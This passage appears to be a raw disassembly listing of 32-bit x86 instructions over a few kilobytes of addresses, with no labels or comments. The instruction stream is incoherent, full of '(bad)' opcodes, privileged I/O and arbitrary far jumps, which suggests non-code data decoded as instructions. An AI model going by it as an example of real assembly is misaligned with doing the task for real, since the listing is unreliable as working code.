  415618:	aad    0x1a
  41561a:	int3   
  41561b:	out    0x24,al
  41561d:	jnp    0x4155fa
  41561f:	ror    BYTE PTR [edi+ecx*8],1
  415622:	outs   dx,BYTE PTR ds:[esi]
  415623:	jmp    0x5385:0xcf2c0550
  41562a:	push   ecx
  41562b:	cdq    
  41562c:	int    0x2d
  41562e:	add    esp,edi
  415630:	and    al,0x49
  415632:	jb     0x415614
  415634:	sbb    al,dl
  415636:	jno    0x4156a6
  415638:	cmc    
  415639:	lock mov ebx,0xd6c5137
  41563f:	test   al,0x26
  415641:	pop    esp
  415642:	scas   eax,DWORD PTR es:[edi]
  415643:	mov    ch,0x2b
  415645:	iret   
  415646:	mov    ebp,0x802ecd2d
  41564b:	das    
  41564c:	inc    edi
  41564d:	ror    BYTE PTR [eax+esi*1],cl
  415650:	mov    ecx,0xca6e5e37
  415655:	(bad)  
  415656:	sar    BYTE PTR [esi-0x3196736a],1
  41565c:	in     eax,dx
  41565d:	ret    0xb59d
  415660:	inc    edx
  415661:	or     dl,BYTE PTR [edi-0x13908222]
  415667:	sub    BYTE PTR [esi],bh
  415669:	push   eax
  41566a:	sbb    al,0x44
  41566c:	jmp    0x4155f3
  41566e:	ins    DWORD PTR es:[di],dx
  415670:	xchg   DWORD PTR [edi+0x2f],esi
  415673:	pop    ecx
  415674:	jmp    0x706864fe
  415679:	sub    al,dh
  41567b:	xor    BYTE PTR [edi],al
  41567d:	lahf   
  41567e:	aaa    
  41567f:	push   ecx
  415680:	adc    eax,0xc3eceb62
  415685:	xchg   ecx,eax
  415686:	sbb    BYTE PTR [ecx*1-0x67f8b3cc],bl
  41568d:	retf   0x4b54
  415690:	es aas 
  415692:	add    al,0xc7
  415694:	fs std 
  415696:	jno    0x41570b
  415698:	les    edx,FWORD PTR [esp+ebx*1]
  41569b:	repz cs test eax,0x46b3874d
  4156a2:	add    ch,BYTE PTR [eax-0xc]
  4156a5:	fmul   DWORD PTR [ecx-0x11]
  4156a8:	test   BYTE PTR [esp+ecx*4+0x57fd1d82],bh
  4156af:	or     eax,0xd110b19d
  4156b4:	push   ss
  4156b5:	pop    esi
  4156b6:	sub    al,0x1f
  4156b8:	lock fcmovu st,st(0)
  4156bb:	and    ecx,DWORD PTR [ebx-0x41c1b870]
  4156c1:	ret    0x4c15
  4156c4:	adc    ch,bh
  4156c6:	push   ss
  4156c7:	clc    
  4156c8:	cmp    al,0xe
  4156ca:	and    al,0xca
  4156cc:	push   ebp
  4156cd:	mov    dl,0xea
  4156cf:	cmc    
  4156d0:	imul   ebx,DWORD PTR [esi-0x66],0x19
  4156d4:	and    al,0x61
  4156d6:	cli    
  4156d7:	mov    al,ds:0xe03fcb97
  4156dc:	(bad)  
  4156dd:	das    
  4156de:	out    0xc1,eax
  4156e0:	push   ebp
  4156e1:	lahf   
  4156e2:	sbb    BYTE PTR [edx],al
  4156e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156e5:	mov    esp,esp
  4156e7:	mov    dh,0x44
  4156e9:	clc    
  4156ea:	out    0xc2,eax
  4156ec:	test   al,0xbf
  4156ee:	nop
  4156ef:	jbe    0x4156cd
  4156f1:	xchg   ecx,eax
  4156f2:	loopne 0x4156c5
  4156f4:	xchg   ecx,eax
  4156f5:	sbb    al,0x9b
  4156f7:	mov    bh,0x7c
  4156f9:	hlt    
  4156fa:	or     BYTE PTR [esi+0x6a4f1eff],al
  415700:	ss xor bl,ch
  415703:	xchg   ebx,eax
  415704:	call   0x7952:0x91d7af66
  41570b:	pop    ebp
  41570c:	fst    st(6)
  41570e:	jne    0x4156b6
  415710:	add    BYTE PTR ds:[esi],bl
  415713:	push   0xffffffb7
  415715:	jbe    0x4156aa
  415717:	sbb    DWORD PTR [ecx-0x78a7ff0],ecx
  41571d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41571e:	fbld   TBYTE PTR [ebx-0x51e7f9b3]
  415724:	mov    esi,DWORD PTR [esi+0x4e]
  415727:	or     al,0xf2
  415729:	mov    ecx,ebp
  41572b:	mov    dl,0xf8
  41572d:	ss loopne 0x4156d4
  415730:	into   
  415731:	ret    0xd007
  415734:	lods   al,BYTE PTR ds:[esi]
  415735:	out    0x4c,eax
  415737:	vcvtss2sd xmm4,xmm5,DWORD PTR [ebp-0x16aa441b]
  41573f:	sub    dl,BYTE PTR [edx+0x56]
  415742:	bound  eax,QWORD PTR [edx+0x0]
  415745:	push   esp
  415746:	int    0x4
  415748:	and    al,0x9b
  41574a:	popf   
  41574b:	arpl   cx,dx
  41574d:	mov    edi,0x777dd34e
  415752:	and    al,0xc5
  415754:	jp     0x4156f8
  415756:	mov    dl,0xba
  415758:	and    eax,0xc80654c
  41575d:	std    
  41575e:	sub    BYTE PTR [edi+0x2a347b81],0x50
  415765:	outs   dx,DWORD PTR ds:[esi]
  415766:	xchg   ebp,eax
  415767:	fwait
  415768:	stc    
  415769:	push   cs
  41576a:	pop    ds
  41576b:	jne    0x4157d6
  41576d:	xor    al,0xb2
  41576f:	sbb    esp,DWORD PTR [eax+0x1c]
  415772:	adc    eax,0x6e8441b
  415777:	jmp    0xe56:0xd55cf5b
  41577e:	test   DWORD PTR [ebx+0x53],0x3253ea2b
  415785:	push   ds
  415786:	nop
  415787:	xor    eax,0x27233db8
  41578c:	dec    esi
  41578d:	ins    DWORD PTR es:[edi],dx
  41578e:	mov    ds:0xa6390002,al
  415793:	clc    
  415794:	add    BYTE PTR [ebp-0x777662b7],ch
  41579a:	stos   DWORD PTR es:[edi],eax
  41579b:	stos   DWORD PTR es:[edi],eax
  41579c:	clc    
  41579d:	enter  0x96b,0xda
  4157a1:	add    bl,bh
  4157a3:	jle    0x4157b7
  4157a5:	pop    ds
  4157a6:	adc    BYTE PTR [edx+0xb54906],ch
  4157ac:	cmp    eax,0xadea7f5e
  4157b1:	mov    bl,0xfa
  4157b3:	das    
  4157b4:	cs mov dh,0x5d
  4157b7:	jmp    0x415761
  4157b9:	ins    DWORD PTR es:[edi],dx
  4157ba:	imul   edx,DWORD PTR [esi],0x71
  4157bd:	sub    dh,al
  4157bf:	adc    BYTE PTR [ecx],bh
  4157c1:	pop    es
  4157c2:	ror    BYTE PTR [ecx-0x35a572da],1
  4157c8:	mov    dl,0x6
  4157ca:	jmp    0xfee1e95e
  4157cf:	inc    ebp
  4157d0:	push   ebx
  4157d1:	arpl   WORD PTR [ebx-0x74],cx
  4157d4:	test   DWORD PTR [esi+0x36b2ac3c],esi
  4157da:	std    
  4157db:	dec    esi
  4157dc:	cdq    
  4157dd:	aam    0x68
  4157df:	dec    edi
  4157e0:	not    DWORD PTR [ebp+0x12]
  4157e3:	arpl   ax,bp
  4157e5:	in     eax,0x9d
  4157e7:	pop    ecx
  4157e8:	jo     0x4157c5
  4157ea:	fisub  WORD PTR [esi+0x4]
  4157ed:	sbb    ebx,esi
  4157ef:	push   es
  4157f0:	loope  0x41581a
  4157f2:	push   ebx
  4157f3:	in     eax,0x7b
  4157f5:	pop    eax
  4157f6:	push   ebp
  4157f7:	daa    
  4157f8:	mov    esp,fs
  4157fa:	fsubr  QWORD PTR [ebp-0x25deb123]
  415800:	inc    ebx
  415801:	int3   
  415802:	imul   edx,DWORD PTR [ecx+0x30],0xc5c809d7
  415809:	clc    
  41580a:	sbb    ah,BYTE PTR [ecx-0x69]
  41580d:	retf   0xdb61
  415810:	out    0xc8,al
  415812:	and    eax,0x34a1cc15
  415817:	test   al,0xe4
  415819:	pop    ds
  41581a:	pop    esp
  41581b:	add    al,0x2f
  41581d:	ret    0x26ab
  415820:	(bad)  
  415821:	or     esp,ecx
  415823:	xor    al,bl
  415825:	dec    eax
  415826:	in     al,0xed
  415828:	xchg   esp,eax
  415829:	aaa    
  41582a:	inc    esp
  41582b:	ins    BYTE PTR es:[edi],dx
  41582c:	mov    ds:0xd0c51563,eax
  415831:	loope  0x415801
  415833:	jg     0x415859
  415835:	jmp    0xb8:0xc6cbc18a
  41583c:	aas    
  41583d:	cwde   
  41583e:	sahf   
  41583f:	dec    ebp
  415840:	cdq    
  415841:	dec    ecx
  415842:	imul   edi,DWORD PTR ds:0x28d1b347,0xbec7a724
  41584c:	popa   
  41584d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41584e:	loopne 0x415876
  415850:	inc    edx
  415851:	xchg   edi,eax
  415852:	and    eax,0x70230e1c
  415857:	push   es
  415858:	inc    ebp
  415859:	bound  ebp,QWORD PTR [esi+0x3722b5b8]
  41585f:	ss out dx,eax
  415861:	mov    ebx,0x15936d54
  415866:	sub    BYTE PTR [eax],0xc1
  415869:	cmp    eax,esp
  41586b:	out    0xd5,eax
  41586d:	fstp   DWORD PTR [ecx-0x5f52964b]
  415873:	ret    0x27da
  415876:	stc    
  415877:	mov    ah,0xbc
  415879:	cwde   
  41587a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41587b:	stc    
  41587c:	push   ds
  41587d:	lea    ebx,[eax]
  41587f:	iret   
  415880:	jbe    0x41589e
  415882:	loope  0x415879
  415884:	push   ds
  415885:	lahf   
  415886:	push   ecx
  415887:	dec    esp
  415888:	xor    bh,dl
  41588a:	dec    ebp
  41588b:	xchg   esi,eax
  41588c:	inc    eax
  41588d:	rcl    cl,cl
  41588f:	xlat   BYTE PTR ds:[ebx]
  415890:	rcl    BYTE PTR [esi-0x36],cl
  415893:	ret    
  415894:	dec    ebx
  415895:	ret    0x592b
  415898:	xchg   edx,eax
  415899:	cdq    
  41589a:	inc    esp
  41589b:	repz sahf 
  41589d:	fsubr  st,st(6)
  41589f:	cmp    ecx,DWORD PTR [eax]
  4158a1:	or     esi,edi
  4158a3:	rcl    ch,1
  4158a5:	push   es
  4158a6:	es add eax,0x276426a1
  4158ac:	sbb    ah,al
  4158ae:	(bad)
  4158b2:	or     ah,ch
  4158b4:	enter  0xdafd,0xd6
  4158b8:	clc    
  4158b9:	jmp    0x8c79e7a3
  4158be:	in     eax,0x9b
  4158c0:	xchg   ecx,eax
  4158c1:	and    BYTE PTR [edi],al
  4158c3:	outs   dx,DWORD PTR ds:[esi]
  4158c4:	add    ebp,DWORD PTR [ecx+0x43d02004]
  4158ca:	xor    dl,BYTE PTR [ebp-0x327935c9]
  4158d0:	jno    0x415903
  4158d2:	nop
  4158d3:	into   
  4158d4:	rol    DWORD PTR ds:0xa5c18adf,1
  4158da:	fbstp  TBYTE PTR [esi-0x6520ab1e]
  4158e0:	xor    al,0xe0
  4158e2:	mov    ebp,0x5e1c355
  4158e7:	int    0xa9
  4158e9:	aaa    
  4158ea:	and    DWORD PTR [esi+0x5ebdb3],ebx
  4158f0:	repnz dec eax
  4158f2:	std    
  4158f3:	pop    edi
  4158f4:	jb     0x415906
  4158f6:	lods   eax,DWORD PTR ds:[esi]
  4158f7:	int3   
  4158f8:	js     0x415940
  4158fa:	push   eax
  4158fb:	loop   0x41588e
  4158fd:	mov    eax,ds:0x53e07cac
  415902:	pop    ds
  415903:	xchg   edi,eax
  415904:	sbb    al,0x47
  415906:	jecxz  0x4158b5
  415908:	enter  0xce0e,0x4e
  41590c:	xchg   edx,eax
  41590d:	ja     0x415942
  41590f:	sbb    al,0x0
  415911:	lods   eax,DWORD PTR ds:[esi]
  415912:	(bad)  
  415913:	pop    ecx
  415914:	loopne 0x415938
  415916:	mov    cl,0xab
  415918:	sbb    edx,DWORD PTR [edx]
  41591a:	daa    
  41591b:	jmp    0x6431637f
  415920:	out    dx,eax
  415921:	push   ebx
  415922:	push   esp
  415923:	jno    0x4158eb
  415925:	ffreep st(1)
  415927:	push   esp
  415928:	mov    gs,WORD PTR [ebp-0xf0203cf]
  41592e:	inc    ebp
  41592f:	or     DWORD PTR [ebx+0x289ed174],ebx
  415935:	mov    ebp,DWORD PTR [eax]
  415937:	mov    ch,0x2e
  415939:	jno    0x4159b5
  41593b:	mov    WORD PTR [ebx+0x37],?
  41593e:	mov    ch,dh
  415940:	push   0x34deb33
  415945:	es xchg esi,eax
  415947:	sbb    bl,BYTE PTR [esi-0x268ca9da]
  41594d:	in     al,0x6e
  41594f:	hlt    
  415950:	ds loope 0x41592e
  415953:	arpl   bp,ax
  415955:	cmp    edi,DWORD PTR [ecx+ebp*1+0x48]
  415959:	dec    eax
  41595a:	jb     0x41591c
  41595c:	xor    DWORD PTR [eax+0x1a],ecx
  41595f:	xchg   esi,eax
  415960:	sub    eax,0xa052a3e6
  415965:	push   es
  415966:	clc    
  415967:	rcr    al,cl
  415969:	push   ebp
  41596a:	jmp    0x69aa64db
  41596f:	push   esi
  415970:	add    al,0xa7
  415972:	adc    bl,bl
  415974:	fidivr DWORD PTR [eax+0x4af04a5f]
  41597a:	xor    bh,dl
  41597c:	arpl   WORD PTR [ebx-0x50],cx
  41597f:	or     al,0x5d
  415981:	inc    edx
  415982:	jno    0x4159ba
  415984:	dec    BYTE PTR [edx+0x44]
  415987:	mov    al,BYTE PTR [edi+0x4590a06c]
  41598d:	js     0x415996
  41598f:	(bad)  
  415990:	mov    ebp,0x976df843
  415995:	arpl   WORD PTR [ebx-0xd],bp
  415998:	jae    0x41599f
  41599a:	pushf  
  41599b:	popf   
  41599c:	mov    cl,0x4d
  41599e:	dec    ebp
  41599f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159a0:	xlat   BYTE PTR ds:[ebx]
  4159a1:	scas   eax,DWORD PTR es:[edi]
  4159a2:	sbb    eax,DWORD PTR ds:0xb6ffa6b6
  4159a8:	or     BYTE PTR [eax],al
  4159aa:	in     al,dx
  4159ab:	sti    
  4159ac:	inc    esi
  4159ad:	mov    ecx,0x53f4f06e
  4159b2:	mov    cl,0x3f
  4159b4:	pop    edi
  4159b5:	lods   al,BYTE PTR ds:[esi]
  4159b6:	dec    esp
  4159b7:	dec    esp
  4159b8:	jne    0x415a31
  4159ba:	mov    bh,0xbb
  4159bc:	mov    cl,0x2c
  4159be:	cmp    bh,cl
  4159c0:	mov    eax,ds:0x5c9f8793
  4159c5:	dec    esi
  4159c6:	data16 sbb BYTE PTR [edx],0x9f
  4159ca:	in     eax,0xe3
  4159cc:	dec    ebx
  4159cd:	sub    BYTE PTR [eax],cl
  4159cf:	(bad)  
  4159d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159d1:	mov    ds:0x31c9d6be,eax
  4159d6:	or     DWORD PTR [eax+0xe],edx
  4159d9:	add    al,0x55
  4159db:	pop    ss
  4159dc:	sub    ebp,DWORD PTR [ebp-0x5d]
  4159df:	xchg   esp,eax
  4159e0:	cwde   
  4159e1:	sbb    ebx,ebx
  4159e3:	jmp    0xd9e8:0xee76b0af
  4159ea:	pop    ss
  4159eb:	mov    ebp,0xf920b05f
  4159f0:	inc    eax
  4159f1:	sub    eax,0x5b05ca7e
  4159f6:	push   0xabd1944b
  4159fb:	xor    ecx,DWORD PTR [edi]
  4159fd:	idiv   BYTE PTR [ebx-0x58]
  415a00:	mul    DWORD PTR [edx+0x6f]
  415a03:	push   esi
  415a04:	nop    ebx
  415a07:	xchg   edx,eax
  415a08:	jbe    0x4159bd
  415a0a:	and    ebp,eax
  415a0c:	rcr    DWORD PTR [ebx-0x3d],cl
  415a0f:	xchg   ebx,eax
  415a10:	mov    al,ds:0xcd551099
  415a15:	and    BYTE PTR [esi+0x151a8596],al
  415a1b:	push   ecx
  415a1c:	push   eax
  415a1d:	pop    ebp
  415a1e:	cmp    edi,DWORD PTR [ebp-0x3b]
  415a21:	out    0xbf,al
  415a23:	dec    ecx
  415a24:	adc    eax,0x4f230aaf
  415a29:	call   FWORD PTR [ebp-0x5e]
  415a2c:	mov    ds:0x5b83d409,eax
  415a31:	cmc    
  415a32:	xlat   BYTE PTR ds:[ebx]
  415a33:	call   0xdeaf498c
  415a38:	gs mov bl,0xcb
  415a3b:	das    
  415a3c:	je     0x415a80
  415a3e:	jns    0x4159f8
  415a40:	in     eax,dx
  415a41:	loop   0x415aa2
  415a43:	mov    esp,0xc3fe6413
  415a48:	ja     0x4159ca
  415a4a:	pop    ebx
  415a4b:	adc    BYTE PTR [eax],cl
  415a4d:	mov    esi,0xbf5ad7ac
  415a52:	sub    DWORD PTR [edi+eax*8-0x98c9bf7],edi
  415a59:	ins    BYTE PTR es:[edi],dx
  415a5a:	fnstenv [edi+0xaae8e12]
  415a60:	lods   eax,DWORD PTR ds:[esi]
  415a61:	xor    DWORD PTR [edx+ebx*1-0x3ddf5510],edx
  415a68:	imul   ecx,DWORD PTR [eax+edx*2],0x9f5958c5
  415a6f:	and    al,0x72
  415a71:	fsubrp st(7),st
  415a73:	cld    
  415a74:	xor    dl,bl
  415a76:	mov    BYTE PTR [edx+0x3b9bf3aa],0x93
  415a7d:	jbe    0x415af1
  415a7f:	xchg   edi,eax
  415a80:	adc    DWORD PTR [ebp-0x53],edx
  415a83:	in     al,dx
  415a84:	fwait
  415a85:	repnz cmp al,0x28
  415a88:	cmp    esi,DWORD PTR [ebx+0x7]
  415a8b:	frstor [ecx+0x4c]
  415a8e:	jmp    0xf72f:0xb5027a5a
  415a95:	push   esp
  415a96:	outs   dx,BYTE PTR ds:[esi]
  415a97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a98:	in     al,0xea
  415a9a:	nop
  415a9b:	cmc    
  415a9c:	clc    
  415a9d:	fs mov cl,0x76
  415aa0:	adc    BYTE PTR [edx-0x7fbb76a4],0xd0
  415aa7:	aad    0xda
  415aa9:	pop    edx
  415aaa:	je     0x415a87
  415aac:	xchg   esi,eax
  415aad:	ret    0xdb48
  415ab0:	sub    DWORD PTR [esi+0x74],edi
  415ab3:	jmp    0x6762:0x5089e896
  415aba:	test   al,0x63
  415abc:	pop    edx
  415abd:	add    bx,WORD PTR [ecx]
  415ac0:	jecxz  0x415ae0
  415ac2:	sub    ebx,DWORD PTR ds:0x3bdfe94e
  415ac8:	sbb    eax,0x971c8a29
  415acd:	into   
  415ace:	and    eax,DWORD PTR [edx+0x53489cbc]
  415ad4:	mov    esp,0xb0defd77
  415ad9:	je     0x415b14
  415adb:	popa   
  415adc:	adc    eax,DWORD PTR [eax+edx*8]
  415adf:	fldcw  WORD PTR [edi]
  415ae1:	or     DWORD PTR [ebp-0xbca27f6],esi
  415ae7:	push   edx
  415ae8:	cmp    dh,ch
  415aea:	sbb    BYTE PTR ss:[edx+0x6d],bh
  415aee:	add    edx,0x1b397a91
  415af4:	push   ds
  415af5:	inc    edi
  415af6:	es cmp eax,esi
  415af9:	xchg   edx,eax
  415afa:	dec    esp
  415afb:	imul   edi,DWORD PTR [ebx-0x42],0x981d299a
  415b02:	mov    edi,0xabcc894
  415b07:	fdiv   QWORD PTR [esi+eax*2+0x53350f45]
  415b0e:	mov    ah,0x26
  415b10:	jo     0x415b5c
  415b12:	mov    ah,0x3e
  415b14:	push   0xffffff8e
  415b16:	dec    esp
  415b17:	std    
  415b18:	rep ins DWORD PTR es:[edi],dx
  415b1a:	cli    
  415b1b:	add    eax,0xad94e0b1
  415b20:	jnp    0x415b7b
  415b22:	fidiv  WORD PTR [ebp-0x3e]
  415b25:	div    DWORD PTR [edx-0x6ffc481f]
  415b2b:	mov    eax,0xca53e9a1
  415b30:	mov    edi,0x5834b919
  415b35:	or     DWORD PTR [esi+0x37],edx
  415b38:	nop
  415b39:	fistp  DWORD PTR [edx]
  415b3b:	cmp    BYTE PTR [edx-0x5357ef9b],0xdd
  415b42:	shr    DWORD PTR [ecx+ebx*4],1
  415b45:	arpl   si,dx
  415b47:	sbb    dl,ch
  415b49:	ret    0x8abf
  415b4c:	pop    ds
  415b4d:	in     eax,0x46
  415b4f:	lods   al,BYTE PTR ds:[esi]
  415b50:	push   ebp
  415b51:	jle    0x415b88
  415b53:	inc    eax
  415b54:	test   BYTE PTR [ebx+0x15],cl
  415b57:	not    DWORD PTR [esi-0x98cd5f9]
  415b5d:	dec    ecx
  415b5e:	test   eax,0xbd0b3145
  415b63:	jno    0x415b7c
  415b65:	or     eax,0xec503d87
  415b6a:	dec    esp
  415b6b:	sbb    esp,DWORD PTR [edi-0x503c9fc7]
  415b71:	adc    DWORD PTR [edx-0x76],ebp
  415b74:	mov    cl,0x30
  415b76:	inc    esi
  415b77:	inc    ebx
  415b78:	sbb    ebx,ecx
  415b7a:	das    
  415b7b:	add    DWORD PTR [eax],ebx
  415b7d:	or     eax,0x7907139a
  415b82:	inc    ecx
  415b83:	out    dx,eax
  415b84:	das    
  415b85:	cmp    BYTE PTR [eax],ah
  415b87:	push   eax
  415b88:	sub    al,0xdd
  415b8a:	inc    eax
  415b8b:	shr    BYTE PTR [edi-0x36],0x77
  415b8f:	ret    0x1454
  415b92:	push   ss
  415b93:	fst    QWORD PTR [ecx]
  415b95:	inc    edi
  415b96:	dec    ecx
  415b97:	and    al,0xbe
  415b99:	orps   xmm4,XMMWORD PTR [ecx+0x24c2c631]
  415ba0:	pop    esi
  415ba1:	cmovo  ebp,DWORD PTR [ecx+0x55]
  415ba5:	sub    eax,0xc4d6f3ba
  415baa:	icebp  
  415bab:	inc    edi
  415bac:	xor    DWORD PTR [eax],eax
  415bae:	jmp    0x415c20
  415bb0:	(bad)  
  415bb1:	mov    ecx,0xb9a07bd4
  415bb6:	xor    eax,0xf181643d
  415bbb:	lahf   
  415bbc:	out    dx,eax
  415bbd:	loopne 0x415bcb
  415bbf:	sub    eax,0x48f2886c
  415bc4:	jae    0x415b76
  415bc6:	push   ds
  415bc7:	pop    ecx
  415bc8:	xor    eax,0xfa5bfedd
  415bcd:	ror    dh,cl
  415bcf:	loope  0x415be6
  415bd1:	adc    BYTE PTR [edi+edi*8],bl
  415bd4:	sub    al,0x70
  415bd6:	jae    0x415c4c
  415bd8:	pushf  
  415bd9:	loope  0x415b85
  415bdb:	pop    esp
  415bdc:	xlat   BYTE PTR ds:[ebx]
  415bdd:	sahf   
  415bde:	fcomp  QWORD PTR [eax]
  415be0:	pusha  
  415be1:	aad    0x74
  415be3:	inc    esp
  415be4:	push   ebx
  415be5:	hlt    
  415be6:	fdiv   QWORD PTR [eax+edi*8-0x589d07a8]
  415bed:	cmp    cl,BYTE PTR [ebx]
  415bef:	jle    0x415c10
  415bf1:	call   0x4fdbfb17
  415bf6:	ret    
  415bf7:	sbb    BYTE PTR [edi],cl
  415bf9:	ja     0x415bdf
  415bfb:	push   edx
  415bfc:	add    bl,BYTE PTR [edx]
  415bfe:	mov    ds:0x6637e99c,al
  415c03:	ret    0x3e3c
  415c06:	mov    dh,dl
  415c08:	popa   
  415c09:	add    edx,ebp
  415c0b:	and    al,0x89
  415c0d:	lods   al,BYTE PTR ds:[esi]
  415c0e:	ss mov edi,0x49b8856
  415c14:	push   cs
  415c15:	mov    ah,BYTE PTR [esi-0x1e271dde]
  415c1b:	aaa    
  415c1c:	out    dx,al
  415c1d:	push   cs
  415c1e:	xor    DWORD PTR [edi-0x25],0x21af93a4
  415c25:	(bad)  
  415c26:	stc    
  415c27:	sar    DWORD PTR [eax+ecx*2-0x30],0xb5
  415c2c:	mov    cs,WORD PTR [eax-0x32365d3a]
  415c32:	sub    DWORD PTR [edi+0x1c],esi
  415c35:	mov    ch,0x2f
  415c37:	in     al,dx
  415c38:	sbb    BYTE PTR [edx+esi*8-0x104dd47b],0xa2
  415c40:	scas   al,BYTE PTR es:[edi]
  415c41:	cwde   
  415c42:	mov    eax,ds:0xb01ace63
  415c47:	lds    ebp,FWORD PTR [ecx-0x6b7ece17]
  415c4d:	(bad)  
  415c4e:	stc    
  415c4f:	in     eax,0x5c
  415c51:	and    BYTE PTR [edx+0x3f73949c],bh
  415c57:	daa    
  415c58:	push   cs
  415c59:	test   eax,0x215a2fe9
  415c5e:	jns    0x415c47
  415c60:	jle    0x415ca9
  415c62:	test   eax,0xcee73418
  415c67:	adc    al,0x2f
  415c69:	cmp    BYTE PTR [esi+0xd],bl
  415c6c:	inc    ebx
  415c6d:	xchg   edi,eax
  415c6e:	lods   al,BYTE PTR ds:[esi]
  415c6f:	sub    esi,DWORD PTR [ebx+esi*8-0x2e]
  415c73:	sbb    bl,BYTE PTR [ecx-0x166141a]
  415c79:	push   edi
  415c7a:	inc    edi
  415c7b:	stos   DWORD PTR es:[edi],eax
  415c7c:	dec    edx
  415c7d:	aas    
  415c7e:	jb     0x415cde
  415c80:	or     BYTE PTR [edx],ch
  415c82:	add    eax,0xe108d579
  415c87:	imul   BYTE PTR [ebp+0x5841c140]
  415c8d:	add    al,0x66
  415c8f:	(bad)  
  415c90:	jge    0x415cd6
  415c92:	ins    DWORD PTR es:[edi],dx
  415c93:	or     al,0xc
  415c95:	xchg   esi,eax
  415c96:	mov    edx,0x547c2bea
  415c9b:	xor    ch,BYTE PTR [edx-0x46c9de84]
  415ca1:	push   ecx
  415ca2:	pop    ebx
  415ca3:	loop   0x415ca9
  415ca5:	outs   dx,BYTE PTR ds:[esi]
  415ca6:	enter  0x6c5d,0xbe
  415caa:	mov    al,0xbd
  415cac:	std    
  415cad:	cld    
  415cae:	gs arpl cx,cx
  415cb1:	cmp    DWORD PTR [edi+0x36f2f289],ebp
  415cb7:	adc    BYTE PTR [edx+eiz*1+0x3e378e04],ah
  415cbe:	(bad)  
  415cbf:	cmp    dh,ah
  415cc1:	addr16 mov cl,0xa7
  415cc4:	shl    BYTE PTR [ebx],1
  415cc6:	adc    eax,0x9db3c86b
  415ccb:	mov    cl,0x2a
  415ccd:	daa    
  415cce:	xor    al,0x77
  415cd0:	dec    ecx
  415cd1:	dec    ebx
  415cd2:	fisubr WORD PTR [eax+eax*8]
  415cd5:	mov    al,0xd7
  415cd7:	xor    bl,dh
  415cd9:	mov    bl,0x98
  415cdb:	jbe    0x415d1f
  415cdd:	sbb    eax,0xac01f263
  415ce2:	mov    es,WORD PTR [edi]
  415ce4:	dec    esp
  415ce5:	aas    
  415ce6:	mov    ds:0x9907beff,al
  415ceb:	fistp  QWORD PTR [ebx-0x6000952a]
  415cf1:	xor    eax,0x44f3e06
  415cf6:	into   
  415cf7:	sub    al,0x56
  415cf9:	sbb    dl,ah
  415cfb:	nop
  415cfc:	enter  0xd415,0x2c
  415d00:	(bad)  
  415d01:	sbb    BYTE PTR [esi+0x6a],ah
  415d04:	xchg   edi,eax
  415d05:	aad    0x95
  415d07:	nop
  415d08:	daa    
  415d09:	mov    bl,0x41
  415d0b:	push   ebx
  415d0c:	(bad)  
  415d0e:	mov    ah,0xaf
  415d10:	mov    cl,0x88
  415d12:	loope  0x415d50
  415d14:	jl     0x415cd8
  415d16:	into   
  415d17:	inc    edi
  415d18:	xchg   edi,eax
  415d19:	xor    ah,BYTE PTR [eax+eiz*1+0x5a]
  415d1d:	(bad)  [ebp+0x73]
  415d20:	jecxz  0x415d7d
  415d22:	lahf   
  415d23:	mov    ch,0xbd
  415d25:	stos   BYTE PTR es:[edi],al
  415d26:	or     BYTE PTR [ebx],ch
  415d28:	int    0xa9
  415d2a:	cmp    ebp,DWORD PTR [ebx]
  415d2c:	sbb    ebp,DWORD PTR [eax]
  415d2e:	add    DWORD PTR [edx-0x14],edx
  415d31:	push   es
  415d32:	adc    DWORD PTR [esp+eiz*8],edi
  415d35:	adc    eax,0x259c2ca
  415d3a:	icebp  
  415d3b:	inc    esi
  415d3c:	in     eax,0x48
  415d3e:	xchg   esi,eax
  415d3f:	mov    esp,0xc35fe93a
  415d44:	fcmovne st,st(7)
  415d46:	data16 (bad) 
  415d48:	shr    BYTE PTR [esi],0x12
  415d4b:	mov    bl,0xb8
  415d4e:	loope  0x415da9
  415d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d51:	or     DWORD PTR [ebx+0x12],edi
  415d54:	jmp    0x415d43
  415d56:	lea    esi,[eax-0x56973417]
  415d5c:	jmp    0x6a5b4147
  415d61:	test   BYTE PTR ds:0x7b016547,bl
  415d67:	mov    ebp,0xdc612120
  415d6c:	push   edi
  415d6d:	adc    DWORD PTR [esi],0xb1e9d3e9
  415d73:	xchg   edx,eax
  415d74:	popa   
  415d75:	sub    al,ah
  415d77:	popf   
  415d78:	pop    esi
  415d79:	adc    eax,0x1e6423b5
  415d7e:	and    dl,bh
  415d80:	ror    BYTE PTR [ebx-0x33],1
  415d83:	jecxz  0x415e01
  415d85:	mov    dl,BYTE PTR [ebx+esi*4-0x47]
  415d89:	sar    DWORD PTR [esi+0x1c],cl
  415d8c:	sar    DWORD PTR [edi],cl
  415d8e:	and    BYTE PTR [ecx],cl
  415d90:	sbb    al,0x25
  415d92:	mov    es,WORD PTR [ebx+eiz*2]
  415d95:	cmp    esp,esp
  415d97:	les    ebx,FWORD PTR [eax+ebx*8+0x196df456]
  415d9e:	mov    dh,0xa9
  415da0:	jo     0x415d26
  415da2:	mov    edx,0x2f54d7ad
  415da7:	es scas al,BYTE PTR es:[edi]
  415da9:	in     al,0x4a
  415dab:	or     dl,BYTE PTR [eax]
  415dad:	xchg   BYTE PTR [edx],cl
  415daf:	idiv   BYTE PTR [edi]
  415db1:	cli    
  415db2:	inc    eax
  415db3:	mov    eax,ds:0x3de2413c
  415db8:	or     BYTE PTR ss:[edx-0x23],0xa1
  415dbd:	lds    ebp,FWORD PTR [ebp+0x64]
  415dc0:	fwait
  415dc1:	jle    0x415db0
  415dc3:	sub    DWORD PTR [ebp+0x64],0xffffff83
  415dc7:	dec    ebp
  415dc8:	ja     0x415dfa
  415dca:	(bad)  
  415dcb:	repnz push edx
  415dcd:	(bad)  
  415dce:	mov    ?,ebx
  415dd0:	int3   
  415dd1:	lds    edx,FWORD PTR [ebp-0x46f3dde]
  415dd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dd8:	mov    WORD PTR [eax],ds
  415dda:	adc    edi,ebp
  415ddc:	in     al,dx
  415ddd:	retf   
